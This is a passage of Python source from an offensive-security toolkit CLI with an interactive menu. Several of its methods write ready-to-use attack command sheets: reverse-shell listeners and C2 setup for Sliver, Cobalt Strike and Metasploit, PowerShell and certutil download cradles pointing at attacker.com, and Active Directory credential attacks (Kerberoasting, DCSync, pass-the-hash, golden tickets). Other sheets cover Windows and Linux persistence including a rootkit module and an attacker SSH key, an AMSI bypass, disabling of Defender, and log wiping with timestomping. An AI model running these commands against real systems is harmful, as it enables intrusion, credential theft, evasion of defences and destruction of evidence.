                # Invalid input, ask to change target or exit
                self.print_colored("Change target (c) or exit (e)? ", "CYAN", end="")
                choice = input().strip().lower()
                if choice == 'c':
                    self.target = self.get_target_input()
                    return True
                else:
                    return False
        except (KeyboardInterrupt, EOFError):
            return False
        except Exception as e:
            self.logger.error(f"Continue prompt error: {e}")
            return False

    def run(self):
        """Main CLI execution loop with comprehensive error handling"""
        try:
            # Initial target setup
            self.print_banner()
            self.print_colored("Welcome to RedTeam AI-Assisted Offensive Security Toolkit!", "GREEN", True)
            print()
            
            default_target = getattr(config, 'DEFAULT_TARGET', 'example.com')
            if self.target == default_target:
                self.print_colored("Set your target:", "BLUE")
                self.target = self.get_target_input()
            
            # Main menu loop
            while self.running:
                try:
                    self.print_banner()
                    self.show_main_menu()
                    
                    choice = self.get_user_choice()
                    print()
                    
                    # Execute selected option
                    if choice == "0":
                        self.print_colored("Thank you for using RedTeam Toolkit!", "GREEN")
                        self.running = False
                        
                    elif choice == "1":
                        self.run_recon(self.target)
                        if not self.continue_prompt():
                            self.running = False
                            
                    elif choice == "2":
                        self.run_initial_access(self.target)
                        if not self.continue_prompt():
                            self.running = False
                            
                    elif choice == "3":
                        self.run_privilege_escalation(self.target)
                        if not self.continue_prompt():
                            self.running = False
                            
                    elif choice == "4":
                        self.run_credential_access(self.target)
                        if not self.continue_prompt():
                            self.running = False
                            
                    elif choice == "5":
                        self.run_post_exploitation(self.target)
                        if not self.continue_prompt():
                            self.running = False
                            
                    elif choice == "6":
                        self.run_av_edr_evasion(self.target)
                        if not self.continue_prompt():
                            self.running = False
                            
                    elif choice == "7":
                        self.run_persistence(self.target)
                        if not self.continue_prompt():
                            self.running = False
                            
                    elif choice == "8":
                        self.run_opsec_anonymity(self.target)
                        if not self.continue_prompt():
                            self.running = False
                            
                    elif choice == "9":
                        self.install_update_tools()
                        input("\nPress Enter to continue...")
                        
                    elif choice == "10":
                        self.show_config_menu()
                        
                    elif choice == "11":
                        self.uninstall_toolkit()
                        
                    else:
                        self.print_colored("❌ Invalid choice. Please select 0-11.", "RED")
                        input("Press Enter to continue...")
                        
                except (KeyboardInterrupt, EOFError):
                    self.print_colored("\n🛑 Operation interrupted", "YELLOW")
                    self.running = False
                except Exception as e:
                    self.print_colored(f"\n❌ Menu error: {str(e)}", "RED")
                    self.logger.error(f"Menu loop error: {e}")
                    input("Press Enter to continue...")
                    
        except Exception as e:
            self.print_colored(f"❌ Fatal error: {str(e)}", "RED")
            self.logger.error(f"Fatal CLI error: {e}")

    def auto_install_tools(self):
        """
        Automatically install required tools for Windows/Linux.
        Falls back gracefully if installation fails.
        """
        self.print_colored("🔧 Auto-installing required tools...", "BLUE", True)
        print()
        
        os_type = platform.system().lower()
        tools_installed = 0
        tools_failed = 0
        
        # Define tools for each OS
        if os_type == "windows":
            tools = {
                "nmap": {"choco": "nmap", "winget": "Insecure.Nmap"},
                "git": {"choco": "git", "winget": "Git.Git"},
                "python": {"choco": "python", "winget": "Python.Python.3"},
                "curl": {"choco": "curl", "winget": "cURL.cURL"},
                "wget": {"choco": "wget", "winget": "JernejSimoncic.Wget"}
            }
            
            # Try Chocolatey first, then winget
            if shutil.which("choco"):
                self.print_colored("📦 Using Chocolatey package manager", "CYAN")
                for tool, packages in tools.items():
                    if not shutil.which(tool):
                        self.print_colored(f"📥 Installing {tool}...", "YELLOW")
                        try:
                            result = subprocess.run(
                                ["choco", "install", packages["choco"], "-y"], 
                                capture_output=True, text=True, timeout=300
                            )
                            if result.returncode == 0:
                                self.print_colored(f"✅ {tool} installed successfully", "GREEN")
                                tools_installed += 1
                            else:
                                self.print_colored(f"❌ Failed to install {tool}", "RED")
                                tools_failed += 1
                        except Exception as e:
                            self.print_colored(f"❌ Error installing {tool}: {str(e)}", "RED")
                            tools_failed += 1
                    else:
                        self.print_colored(f"✅ {tool} already installed", "GREEN")
                        
            elif shutil.which("winget"):
                self.print_colored("📦 Using Windows Package Manager (winget)", "CYAN")
                for tool, packages in tools.items():
                    if not shutil.which(tool):
                        self.print_colored(f"📥 Installing {tool}...", "YELLOW")
                        try:
                            result = subprocess.run(
                                ["winget", "install", packages["winget"], "--accept-package-agreements", "--accept-source-agreements"], 
                                capture_output=True, text=True, timeout=300
                            )
                            if result.returncode == 0:
                                self.print_colored(f"✅ {tool} installed successfully", "GREEN")
                                tools_installed += 1
                            else:
                                self.print_colored(f"❌ Failed to install {tool}", "RED")
                                tools_failed += 1
                        except Exception as e:
                            self.print_colored(f"❌ Error installing {tool}: {str(e)}", "RED")
                            tools_failed += 1
                    else:
                        self.print_colored(f"✅ {tool} already installed", "GREEN")
            else:
                self.print_colored("❌ No package manager found (choco/winget)", "RED")
                self.print_colored("💡 Install Chocolatey: https://chocolatey.org/install", "YELLOW")
                
        elif os_type == "linux":
            tools = ["nmap", "git", "curl", "wget", "python3", "python3-pip"]
            
            # Try different package managers
            if shutil.which("apt-get"):
                self.print_colored("📦 Using APT package manager", "CYAN")
                try:
                    # Update package list
                    subprocess.run(["sudo", "apt-get", "update"], 
                                 capture_output=True, text=True, timeout=60)
                    
                    for tool in tools:
                        if not shutil.which(tool):
                            self.print_colored(f"📥 Installing {tool}...", "YELLOW")
                            try:
                                result = subprocess.run(
                                    ["sudo", "apt-get", "install", "-y", tool], 
                                    capture_output=True, text=True, timeout=300
                                )
                                if result.returncode == 0:
                                    self.print_colored(f"✅ {tool} installed successfully", "GREEN")
                                    tools_installed += 1
                                else:
                                    self.print_colored(f"❌ Failed to install {tool}", "RED")
                                    tools_failed += 1
                            except Exception as e:
                                self.print_colored(f"❌ Error installing {tool}: {str(e)}", "RED")
                                tools_failed += 1
                        else:
                            self.print_colored(f"✅ {tool} already installed", "GREEN")
                except Exception as e:
                    self.print_colored(f"❌ APT update failed: {str(e)}", "RED")
                    
            elif shutil.which("yum"):
                self.print_colored("📦 Using YUM package manager", "CYAN")
                for tool in tools:
                    if not shutil.which(tool):
                        self.print_colored(f"📥 Installing {tool}...", "YELLOW")
                        try:
                            result = subprocess.run(
                                ["sudo", "yum", "install", "-y", tool], 
                                capture_output=True, text=True, timeout=300
                            )
                            if result.returncode == 0:
                                self.print_colored(f"✅ {tool} installed successfully", "GREEN")
                                tools_installed += 1
                            else:
                                self.print_colored(f"❌ Failed to install {tool}", "RED")
                                tools_failed += 1
                        except Exception as e:
                            self.print_colored(f"❌ Error installing {tool}: {str(e)}", "RED")
                            tools_failed += 1
                    else:
                        self.print_colored(f"✅ {tool} already installed", "GREEN")
                        
            elif shutil.which("dnf"):
                self.print_colored("📦 Using DNF package manager", "CYAN")
                for tool in tools:
                    if not shutil.which(tool):
                        self.print_colored(f"📥 Installing {tool}...", "YELLOW")
                        try:
                            result = subprocess.run(
                                ["sudo", "dnf", "install", "-y", tool], 
                                capture_output=True, text=True, timeout=300
                            )
                            if result.returncode == 0:
                                self.print_colored(f"✅ {tool} installed successfully", "GREEN")
                                tools_installed += 1
                            else:
                                self.print_colored(f"❌ Failed to install {tool}", "RED")
                                tools_failed += 1
                        except Exception as e:
                            self.print_colored(f"❌ Error installing {tool}: {str(e)}", "RED")
                            tools_failed += 1
                    else:
                        self.print_colored(f"✅ {tool} already installed", "GREEN")
            else:
                self.print_colored("❌ No supported package manager found", "RED")
                self.print_colored("💡 Supported: apt-get, yum, dnf", "YELLOW")
        else:
            self.print_colored(f"❌ Unsupported OS: {os_type}", "RED")
            
        # Summary
        print()
        self.print_colored(f"📊 Installation Summary:", "BLUE", True)
        self.print_colored(f"✅ Successfully installed: {tools_installed}", "GREEN")
        if tools_failed > 0:
            self.print_colored(f"❌ Failed installations: {tools_failed}", "RED")
            self.print_colored("💡 Please install failed tools manually", "YELLOW")

    def _generate_recon_summary(self, target: str, results: Dict):
        """
        Compile available recon tool outputs into a comprehensive summary file.
        """
        if not self.tool_executor:
            return
            
        summary_path = self.tool_executor.loot_dir / "recon_summary.md"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        try:
            with open(summary_path, "w", encoding="utf-8") as f:
                # Header
                f.write(f"# Reconnaissance Summary for {target}\n\n")
                f.write(f"**Generated:** {timestamp}  \n")
                f.write(f"**Session ID:** {self.session_id}  \n")
                f.write("=" * 80 + "\n\n")
                
                # Executive Summary
                f.write("## Executive Summary\n\n")
                successful_tools = [tool for tool, result in results.items() if result.get("success")]
                failed_tools = [tool for tool, result in results.items() if not result.get("success")]
                
                f.write(f"- **Target:** {target}\n")
                f.write(f"- **Tools Executed:** {len(results)}\n")
                f.write(f"- **Successful:** {len(successful_tools)}\n")
                f.write(f"- **Failed:** {len(failed_tools)}\n\n")
                
                if successful_tools:
                    f.write("**Successful Tools:** " + ", ".join(successful_tools) + "\n\n")
                if failed_tools:
                    f.write("**Failed Tools:** " + ", ".join(failed_tools) + "\n\n")
                
                # Detailed Results
                f.write("## Detailed Results\n\n")
                
                for tool_name, result in results.items():
                    f.write(f"### {tool_name.upper()}\n\n")
                    f.write(f"**Status:** {'✅ Success' if result.get('success') else '❌ Failed'}  \n")
                    f.write(f"**Command:** `{result.get('command', 'N/A')}`  \n")
                    
                    if result.get("execution_time"):
                        f.write(f"**Execution Time:** {result['execution_time']:.2f}s  \n")
                    
                    f.write("\n")
                    
                    if result.get("success"):
                        output_file = result.get("output_file")
                        if output_file:
                            output_path = self.tool_executor.loot_dir / output_file
                            f.write(f"**Output File:** `{output_file}`\n\n")
                            
                            if output_path.exists():
                                try:
                                    with open(output_path, "r", encoding="utf-8", errors="ignore") as outf:
                                        content = outf.read()
                                        # Limit content length for summary
                                        if len(content) > 2000:
                                            content = content[:2000] + "\n\n[... output truncated ...]\n"
                                        f.write("```\n")
                                        f.write(content)
                                        f.write("\n```\n\n")
                                except Exception as e:
                                    f.write(f"*Could not read output file: {e}*\n\n")
                            else:
                                f.write("*Output file not found*\n\n")
                        else:
                            # Direct output
                            output = result.get("output", "")
                            if output:
                                if len(output) > 2000:
                                    output = output[:2000] + "\n\n[... output truncated ...]"
                                f.write("```\n")
                                f.write(output)
                                f.write("\n```\n\n")
                            else:
                                f.write("*No output captured*\n\n")
                    else:
                        # Error information
                        error = result.get("error", "Unknown error")
                        f.write(f"**Error:** {error}\n\n")
                    
                    f.write("---\n\n")
                
                # Key Findings Section
                f.write("## Key Findings\n\n")
                
                # Analyze results for key findings
                findings = []
                
                # Check nmap results
                if "nmap" in results and results["nmap"].get("success"):
                    findings.append("- Port scan completed - check nmap output for open services")
                
                # Check subdomain enumeration
                subdomain_tools = ["amass", "subfinder"]
                for tool in subdomain_tools:
                    if tool in results and results[tool].get("success"):
                        findings.append(f"- Subdomain enumeration completed with {tool}")
                
                # Check web technology detection
                if "whatweb" in results and results["whatweb"].get("success"):
                    findings.append("- Web technology fingerprinting completed")
                
                # Check directory bruteforcing
                if "gobuster" in results and results["gobuster"].get("success"):
                    findings.append("- Directory bruteforcing completed")
                
                if findings:
                    for finding in findings:
                        f.write(finding + "\n")
                else:
                    f.write("- No significant findings detected in automated analysis\n")
                
                f.write("\n")
                
                # Next Steps
                f.write("## Recommended Next Steps\n\n")
                f.write("1. Manually review all tool outputs for detailed findings\n")
                f.write("2. Investigate open ports and services from nmap scan\n")
                f.write("3. Test discovered subdomains for vulnerabilities\n")
                f.write("4. Analyze web application technologies for known CVEs\n")
                f.write("5. Explore discovered directories and endpoints\n\n")
                
                # File Locations
                f.write("## Output Files\n\n")
                for tool_name, result in results.items():
                    if result.get("success") and result.get("output_file"):
                        f.write(f"- **{tool_name}:** `loot/{target}/{result['output_file']}`\n")
                
                f.write(f"\n**Summary Location:** `loot/{target}/recon_summary.md`\n")
                
            self.print_colored(f"📄 Comprehensive recon summary generated: {summary_path}", "CYAN")
            
        except Exception as e:
            self.print_colored(f"❌ Failed to generate recon summary: {str(e)}", "RED")
            if self.logger:
                self.logger.error(f"Recon summary generation error: {e}")

    def _generate_listener_commands(self, lhost: str, lport: int, target_os: str):
        """Generate listener setup commands"""
        listener_script = self.script_gen.safe_write("listener_commands.txt", f"""
# Listener Commands for {target_os.title()} Payloads

## Metasploit Listener
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j

## Netcat Listener
nc -lvnp {lport}

## PowerShell Empire (if installed)
listeners
uselistener http
set Host {lhost}
set Port {lport}
execute

## Sliver C2 (if installed)
mtls --lhost {lhost} --lport {lport}
""")
        if listener_script:
            self.print_colored(f"📁 Listener commands saved: {listener_script}", "CYAN")

    def _generate_lateral_movement_scripts(self, target: str):
        """Generate lateral movement and credential access scripts"""
        # Windows lateral movement script
        windows_lat_content = f"""# Windows Lateral Movement Commands for {target}

# Password spraying
crackmapexec smb {target} -u users.txt -p passwords.txt --continue-on-success
crackmapexec winrm {target} -u users.txt -p passwords.txt --continue-on-success

# Kerberoasting
GetUserSPNs.py DOMAIN/user:password -dc-ip {target} -request

# ASREPRoasting
GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# DCSync
secretsdump.py DOMAIN/user:password@{target} -just-dc-ntlm

# Golden Ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain DOMAIN administrator

# Pass-the-Hash
wmiexec.py -hashes LMHASH:NTHASH administrator@{target}
psexec.py -hashes LMHASH:NTHASH administrator@{target}

# BloodHound data collection
SharpHound.exe -c All -d DOMAIN
"""
        
        # Linux lateral movement script  
        linux_lat_content = f"""# Linux Lateral Movement Commands for {target}

# SSH key harvesting
find /home -name "*.pub" -o -name "id_*" 2>/dev/null

# Sudo privilege escalation
sudo -l
find /etc/sudoers.d/ -readable 2>/dev/null

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Credential harvesting
grep -r "password" /etc/ 2>/dev/null
find /home -name "*.bash_history" -exec grep -l "ssh\|password\|mysql" {{}} \;

# Network discovery
arp -a
ss -tuln
netstat -antup

# Container escape (if in container)
fdisk -l
mount | grep docker
ls -la /proc/1/
"""

        self.script_gen.safe_write("windows_lateral_movement.txt", windows_lat_content)
        self.script_gen.safe_write("linux_lateral_movement.txt", linux_lat_content)
        self.print_colored("📁 Lateral movement scripts generated", "CYAN")

    def _generate_c2_scripts(self, target: str):
        """Generate C2 deployment scripts"""
        # Sliver C2 script
        sliver_content = f"""# Sliver C2 Deployment for {target}

# Start Sliver server
sliver-server

# Generate implant
generate --mtls {target}:8443 --os windows --arch amd64 --format exe --save /tmp/implant.exe

# Start MTLS listener
mtls --lhost 0.0.0.0 --lport 8443

# Generate HTTP implant
generate --http {target}:80 --os linux --arch amd64 --format elf --save /tmp/linux_implant

# Start HTTP listener
http --lhost 0.0.0.0 --lport 80
"""

        # Cobalt Strike script
        cs_content = f"""# Cobalt Strike Deployment for {target}

# Start team server
./teamserver {target} password malleable_profile.txt

# Generate payloads
./cobaltstrike
# Use GUI to generate stageless payloads

# PowerShell cradle
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://{target}:80/a'))"

# Malleable C2 profile example
set sample_name "Custom Profile";
set sleeptime "30000";
set jitter    "20";

http-get {{
    set uri "/search /news /about";
    client {{
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    }}
}}
"""

        # Metasploit C2 script
        msf_content = f"""# Metasploit Framework C2 for {target}

# Multi handler
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST {target}
set LPORT 443
set HandlerSSLCert /path/to/cert.pem
exploit -j

# Web delivery
use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_tcp
set LHOST {target}
set LPORT 4444
exploit

# PowerShell Empire commands
uselistener http
set Host {target}
set Port 80
execute

usestager multi/launcher
set Listener http
execute
"""

        self.script_gen.safe_write("sliver_c2.txt", sliver_content)
        self.script_gen.safe_write("cobaltstrike_c2.txt", cs_content)
        self.script_gen.safe_write("metasploit_c2.txt", msf_content)
        self.print_colored("📁 C2 deployment scripts generated", "CYAN")

    def _generate_persistence_scripts(self, target: str):
        """Generate persistence mechanism scripts"""
        # Windows persistence
        win_persist_content = f"""# Windows Persistence Mechanisms for {target}

# Registry Run keys
reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\\Windows\\System32\\svchost.exe" /f
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "OneDriveSync" /t REG_SZ /d "C:\\Users\\Public\\sync.exe" /f

# Scheduled tasks
schtasks /create /tn "Windows Security Update" /tr "C:\\Windows\\System32\\payload.exe" /sc onlogon /ru SYSTEM /f
schtasks /create /tn "Adobe Updater" /tr "C:\\Program Files\\Common Files\\Adobe\\update.exe" /sc daily /st 09:00 /f

# Services
sc create "WindowsDefenderService" binpath= "C:\\Windows\\System32\\defender.exe" start= auto
sc description "WindowsDefenderService" "Windows Defender Antivirus Service"

# WMI event subscription
wmic /namespace:"\\\\root\\subscription" PATH __EventFilter CREATE Name="BotFilter82", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"

# COM hijacking
reg add "HKCU\\Software\\Classes\\CLSID\\{{CLSID}}\\InprocServer32" /ve /t REG_SZ /d "C:\\Users\\Public\\com.dll" /f

# Startup folder
copy payload.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe"

# DLL hijacking
copy legitimate.exe C:\\temp\\
copy malicious.dll C:\\temp\\legitimate_dependency.dll

# Reflective DLL injection
powershell -c "Invoke-ReflectivePEInjection -PEPath payload.dll"

# Registry-less COM
regsvr32 /s /n /u /i:http://attacker.com/script.sct scrobj.dll

# Fileless execution
powershell -c "$code = [System.Convert]::FromBase64String('BASE64_PAYLOAD'); [System.Reflection.Assembly]::Load($code)"

# UAC bypass
eventvwr.exe
# Replace with malicious executable in HKCU\\Software\\Classes\\mscfile\\shell\\open\\command

# Disable Windows Defender
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -c "Add-MpPreference -ExclusionPath 'C:\\'"
"""

        # Linux persistence
        linux_persist_content = f"""# Linux Persistence Mechanisms for {target}

# Crontab persistence
echo "*/10 * * * * /tmp/.update >/dev/null 2>&1" | crontab -
echo "@reboot /tmp/.update >/dev/null 2>&1" | crontab -

# Systemd service
cat > /etc/systemd/system/system-update.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=forking
ExecStart=/tmp/.update
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl enable system-update.service
systemctl start system-update.service

# Init.d script
cat > /etc/init.d/system-update << EOF
#!/bin/bash
case "\$1" in
    start)
        /tmp/.update &
        ;;
    stop)
        pkill -f .update
        ;;
    restart)
        \$0 stop
        \$0 start
        ;;
esac
EOF

chmod +x /etc/init.d/system-update
update-rc.d system-update defaults

# SSH key harvesting
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Bash profile persistence
echo "/tmp/.update &" >> ~/.bashrc
echo "/tmp/.update &" >> ~/.profile

# LD_PRELOAD
echo "/lib/evil.so" >> /etc/ld.so.preload

# SUID backdoor
cp /bin/bash /tmp/.bash
chmod +s /tmp/.bash

# Kernel module persistence (advanced)
insmod /tmp/rootkit.ko
echo "/tmp/rootkit.ko" >> /etc/modules
"""

        self.script_gen.safe_write("windows_persistence_advanced.txt", win_persist_content)
        self.script_gen.safe_write("linux_persistence_advanced.txt", linux_persist_content)
        self.print_colored("📁 Advanced persistence scripts generated", "CYAN")

    def _generate_antiforensics_scripts(self):
        """Generate anti-forensics and cleanup scripts"""
        antiforensics_content = """# Anti-Forensics and Cleanup Script

# Clear Windows event logs
wevtutil cl System
wevtutil cl Security  
wevtutil cl Application
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# Clear Linux logs
rm -f /var/log/auth.log*
rm -f /var/log/syslog*
rm -f /var/log/messages*
rm -f /var/log/secure*
rm -f ~/.bash_history
history -c

# Clear command history
del %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
rm ~/.bash_history ~/.zsh_history ~/.python_history

# Timestomp files (Windows)
powershell "$(Get-Item file.exe).creationtime=$(Get-Date '01/01/2020 12:00 am')"
powershell "$(Get-Item file.exe).lastaccesstime=$(Get-Date '01/01/2020 12:00 am')"
powershell "$(Get-Item file.exe).lastwritetime=$(Get-Date '01/01/2020 12:00 am')"

# Secure delete
sdelete -p 3 -s -z C:
shred -vfz -n 3 /path/to/file

# Clear registry traces
reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs" /f
reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU" /f

# Clear prefetch
del C:\\Windows\\Prefetch\\*.pf

# Clear temp files
del /q /s %TEMP%\\*
rm -rf /tmp/* /var/tmp/*

# Clear browser artifacts
del "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History"
del "%APPDATA%\\Mozilla\\Firefox\\Profiles\\*\\places.sqlite"

# Network artifact cleanup
arp -d *
netsh interface ip delete arpcache
ip -s -s neigh flush all
"""
        
        script_path = self.script_gen.safe_write("antiforensics_cleanup.txt", antiforensics_content)
        if script_path:
            self.print_colored(f"📁 Anti-forensics script: {script_path}", "CYAN")

    def _generate_evasion_scripts(self):
        """Generate AV/EDR evasion scripts"""
        evasion_content = """# AV/EDR Evasion Techniques

# PowerShell execution policy bypass
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -c "Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser"

# AMSI bypass
powershell -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"

# PowerShell download cradles
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"
powershell -c "IEX(IWR('http://attacker.com/script.ps1') -UseBasicParsing).Content"

# Living off the land binaries
certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe
bitsadmin /transfer myDownloadJob /download /priority normal http://attacker.com/payload.exe C:\\temp\\payload.exe

# Process hollowing
# Use tools like ProcessHacker or custom C# code

# DLL sideloading
copy legitimate.exe C:\\temp\\
copy malicious.dll C:\\temp\\legitimate_dependency.dll

# Reflective DLL injection
powershell -c "Invoke-ReflectivePEInjection -PEPath payload.dll"

# Registry-less COM
regsvr32 /s /n /u /i:http://attacker.com/script.sct scrobj.dll

# Fileless execution
powershell -c "$code = [System.Convert]::FromBase64String('BASE64_PAYLOAD'); [System.Reflection.Assembly]::Load($code)"

# UAC bypass
eventvwr.exe
# Replace with malicious executable in HKCU\\Software\\Classes\\mscfile\\shell\\open\\command

# Disable Windows Defender
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -c "Add-MpPreference -ExclusionPath 'C:\\'"
"""
        
        script_path = self.script_gen.safe_write("evasion_techniques.txt", evasion_content)
        if script_path:
            self.print_colored(f"📁 Evasion techniques script: {script_path}", "CYAN")

    def run_opsec_anonymity(self, target: str):
        """Execute OPSEC and anonymity infrastructure setup"""
        self.print_colored(f"🔒 Running OPSEC & Anonymity Infrastructure for: {target}", "GREEN", True)
        print()
        
        # Check current IP and VPN status
        self._check_vpn_status()
        
        # Configure Tor
        self._configure_tor_setup()
        
        # Configure ProxyChains
        self._configure_proxychains()
        
        # Setup stealth iptables rules
        self._configure_stealth_iptables()
        
        # Generate OPSEC checklist
        self._generate_opsec_checklist()

    def _configure_tor_setup(self):
        """Configure Tor for anonymity"""
        tor_config = self.tool_executor.loot_dir / "torrc"
        
        config_content = """# Tor configuration for red team operations
SocksPort 9050
ControlPort 9051
CookieAuthentication 1
ExitPolicy reject *:*

# Additional relays for better anonymity
UseBridges 1
ClientTransportPlugin obfs4 exec /usr/bin/obfs4proxy

# Disable features that could leak info
DisableDebuggerAttachment 1
SafeLogging 1
HardwareAccel 0

# Directory authorities
DirReqStatistics 0
EntryStatistics 0
ExtraInfoStatistics 0
"""
        
        with open(tor_config, 'w') as f:
            f.write(config_content)
        
        self.print_colored(f"📁 Tor config: {tor_config}", "CYAN")
        
        # Start Tor service
        if self.tool_executor.check_tool("tor"):
            self.print_colored("🔧 Starting Tor service...", "BLUE")
            result = self.tool_executor.execute_tool(
                "tor",
                ["tor", "-f", str(tor_config)],
                timeout=30
            )
            if result["success"]:
                self.print_colored("✅ Tor service started", "GREEN")
            else:
                self.print_colored("❌ Failed to start Tor", "RED")

    def _configure_stealth_iptables(self):
        """Configure iptables for stealth"""
        iptables_script = self.tool_executor.loot_dir / "stealth_iptables.sh"
        
        script_content = """#!/bin/bash
# Stealth iptables configuration

# Drop ICMP ping responses
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# Rate limit connections
iptables -A INPUT -p tcp --dport 22 -m limit --limit 3/min -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP

# Log and drop port scans
iptables -A INPUT -m recent --name portscan --rcheck --seconds 86400 -j DROP
iptables -A FORWARD -m recent --name portscan --rcheck --seconds 86400 -j DROP

# Route traffic through Tor
iptables -t nat -A OUTPUT -p tcp --dport 80 -j REDIRECT --to-port 9040
iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-port 9040

echo "Stealth iptables rules applied"
"""
        
        with open(iptables_script, 'w') as f:
            f.write(script_content)
        
        iptables_script.chmod(0o755)
        self.print_colored(f"📁 Stealth iptables script: {iptables_script}", "CYAN")

    def _configure_proxychains(self):
        """Configure proxychains for Tor"""
        proxychains_config = self.tool_executor.loot_dir / "proxychains.conf"
        
        config_content = """# ProxyChains configuration for Tor
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 9050
"""
        
        with open(proxychains_config, 'w') as f:
            f.write(config_content)
        
        self.print_colored(f"📁 ProxyChains config: {proxychains_config}", "CYAN")

    def _check_vpn_status(self):
        """Check VPN connection status"""
        self.print_colored("🔍 Checking VPN status...", "BLUE")
        
        # Check public IP
        ip_result = self.tool_executor.execute_tool(
            "curl",
            ["curl", "-s", "ifconfig.me"],
            timeout=10
        )
        
        if ip_result["success"]:
            public_ip = ip_result["output"].strip()
            self.print_colored(f"📍 Public IP: {public_ip}", "CYAN")
        else:
            self.print_colored("❌ Failed to check public IP", "RED")

    def _generate_opsec_checklist(self):
        """Generate OPSEC checklist"""
        checklist_file = self.tool_executor.loot_dir / "opsec_checklist.md"
        
        checklist_content = """# OPSEC Checklist

## Pre-Engagement
- [ ] VPN connection active
- [ ] Tor service running
- [ ] ProxyChains configured
- [ ] Burner email configured
- [ ] VM/Container environment

## During Engagement
- [ ] All traffic routed through proxies
- [ ] No direct IP connections to target
- [ ] User agent randomization
- [ ] Rate limiting on scans
- [ ] Encrypted C2 channels

## Post-Engagement
- [ ] Clear command history
- [ ] Remove temporary files
- [ ] Clear system logs
- [ ] Secure delete sensitive data
- [ ] Verify no persistence left behind

## Continuous
- [ ] Monitor for blue team activity
- [ ] Rotate infrastructure regularly
- [ ] Use domain fronting
- [ ] Implement kill switches
"""
        
        with open(checklist_file, 'w') as f:
            f.write(checklist_content)
        
        self.print_colored(f"📁 OPSEC checklist: {checklist_file}", "CYAN")

    def uninstall_toolkit(self):
        """Uninstall the toolkit with user confirmation"""
        self.print_colored("🗑️ Uninstall Toolkit", "RED", True)
        self.print_colored("=" * 30, "RED")
        print()
        
        self.print_colored("⚠️ This will remove the RedTeam toolkit from your system.", "YELLOW")
        print()
        
        # Ask about keeping tools
        self.print_colored("Do you want to keep the installed tools? (y/n): ", "CYAN", end="")
        keep_tools = input().strip().lower()
        
        print()
        self.print_colored("Are you sure you want to proceed? (y/n): ", "RED", end="")
        confirm = input().strip().lower()
        
        if confirm == 'y':
            try:
                if keep_tools == 'y':
                    # Remove only toolkit scripts, keep tools
                    self.print_colored("🔧 Removing toolkit scripts, keeping tools...", "YELLOW")
                    
                    # Remove Python scripts
                    for script in ["cli.py"]:
                        script_path = self.toolkit_dir / script
                        if script_path.exists():
                            script_path.unlink()
                    
                    # Remove directories but keep tools
                    for d in ["logs", "temp", "results", "loot"]:
                        dir_path = self.toolkit_dir / d
                        if dir_path.exists():
                            shutil.rmtree(dir_path, ignore_errors=True)
                    
                    self.print_colored("✅ Toolkit scripts removed, tools preserved", "GREEN")
                    
                else:
                    # Remove everything
                    self.print_colored("🗑️ Removing entire toolkit and all data...", "YELLOW")
                    
                    # Remove toolkit directory
                    if self.toolkit_dir.exists() and self.toolkit_dir != Path.home():
                        shutil.rmtree(self.toolkit_dir, ignore_errors=True)
                    
                    self.print_colored("✅ Complete uninstallation successful", "GREEN")
                
                # Always remove logs for security
                self.print_colored("🧹 Removing logs...", "YELLOW")
                logs_dir = self.toolkit_dir / "logs"
                if logs_dir.exists():
                    shutil.rmtree(logs_dir, ignore_errors=True)
                    self.print_colored("✅ Logs removed", "GREEN")
                
                print()
                self.print_colored("Thank you for using RedTeam Toolkit!", "CYAN")
                self.running = False
                
            except Exception as e:
                self.print_colored(f"❌ Uninstallation error: {str(e)}", "RED")
        else:
            self.print_colored("❌ Uninstallation cancelled", "YELLOW")

def main():
    import argparse
    parser = argparse.ArgumentParser(description="RedTeam Toolkit CLI")
    parser.add_argument("--dry-run", action="store_true", help="Simulate actions without executing")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode")
    args = parser.parse_args()
    try:
        cli = RedTeamCLI(dry_run=args.dry_run, debug=args.debug)
        cli.run()
    except KeyboardInterrupt:
